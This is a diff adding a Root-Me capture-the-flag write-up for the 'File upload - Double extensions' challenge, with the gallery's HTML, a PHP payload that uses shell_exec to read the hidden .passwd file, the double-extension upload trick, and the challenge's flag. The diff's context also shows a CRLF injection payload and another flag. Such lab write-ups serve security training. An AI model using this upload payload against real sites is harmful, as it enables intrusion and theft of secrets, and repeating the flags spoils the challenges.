@@ -20,7 +20,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 12. [HTTP - Verb tampering](#http-verb-tampering) 🗸
 13. [Install files](#install-files) 🗸
 14. [CRLF](#crlf) 🗸
-15. [File upload - Double extensions](#file-upload-double-extensions)
+15. [File upload - Double extensions](#file-upload-double-extensions) 🗸
 16. [File upload - MIME type](#file-upload-mime-type)
 17. [HTTP - Cookies](#http-cookies)
 18. [Insecure Code Management](#insecure-code-management)
@@ -1474,6 +1474,163 @@ ch14/?username=admin%20authenticated.%0D%0Atest&password=test
 
 ~~~
 rFSP&G0p&5uAg1%
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## File Upload Double extensions
+
+- Author: g0uZ
+- Date: 24 December 2012
+- Points: 20
+- Level: 2
+
+### Statement
+
+Your goal is to hack this photo galery by uploading PHP code.
+Retrieve the validation password in the file .passwd at the root of the application.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch20/).
+
+### Resources
+
+1. [Secure file upload in PHP web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We find a gallery webpage with the following html:
+
+~~~html
+<html>
+  <body>
+    <h1>Photo gallery v 0.02
+    </h1>
+    <span id="menu"/>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=emotes'>emotes
+      </a>
+    </span>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=apps'>
+        <b>apps
+        </b>
+      </a>
+    </span>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=upload'>upload
+      </a>
+    </span>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=devices'>devices
+      </a>
+    </span>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=categories'>categories
+      </a>
+    </span>&nbsp;|&nbsp;
+    <span>
+      <a href='?galerie=actions'>actions
+      </a>
+    </span>
+    <br>
+    <hr>
+    <table id="content">
+      <tr>
+        <td>
+          <a href='galerie/apps/preferences-desktop-screensaver.png'>
+            <img width=64px height=64px src='galerie/apps/preferences-desktop-screensaver.png?preview' alt='preferences-desktop-screensaver.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/krita.png'>
+            <img width=64px height=64px src='galerie/apps/krita.png?preview' alt='krita.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/graphics-viewer-document.png'>
+            <img width=64px height=64px src='galerie/apps/graphics-viewer-document.png?preview' alt='graphics-viewer-document.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/kexi.png'>
+            <img width=64px height=64px src='galerie/apps/kexi.png?preview' alt='kexi.png'>
+          </a>
+        </td>
+      </tr>
+      <tr>
+      </tr>
+      <tr>
+        <td>
+          <a href='galerie/apps/kthesaurus.png'>
+            <img width=64px height=64px src='galerie/apps/kthesaurus.png?preview' alt='kthesaurus.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/plasmagik.png'>
+            <img width=64px height=64px src='galerie/apps/plasmagik.png?preview' alt='plasmagik.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/showfoto.png'>
+            <img width=64px height=64px src='galerie/apps/showfoto.png?preview' alt='showfoto.png'>
+          </a>
+        </td>
+        <td>
+          <a href='galerie/apps/utilities-terminal.png'>
+            <img width=64px height=64px src='galerie/apps/utilities-terminal.png?preview' alt='utilities-terminal.png'>
+          </a>
+        </td>
+      </tr>
+      <tr>
+      </tr>
+      <tr>
+        <td>
+          <a href='galerie/apps/preferences-desktop-user-password.png'>
+            <img width=64px height=64px src='galerie/apps/preferences-desktop-user-password.png?preview' alt='preferences-desktop-user-password.png'>
+          </a>
+        </td>
+      </tr>
+    </table>
+  </body>
+</html>
+~~~
+
+Trying to access /.passwd we get a forbidden response. 
+
+
+We can find an upload form for uploading new content, the new images are stored in ./galerie/upload/<filehash>/image.png. Let's try a simple php file:
+
+~~~php
+<?php
+  $flag = shell_exec('strings ../../../.passwd');
+  echo "<pre>$flag</pre>";
+?>
+~~~
+
+We can call this "real_image.php.png" and upload.  When we navigate to the image, we get the flag.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+Gg9LRz-hWSxqqUKd77-_q-6G8
 ~~~
 
 </details>
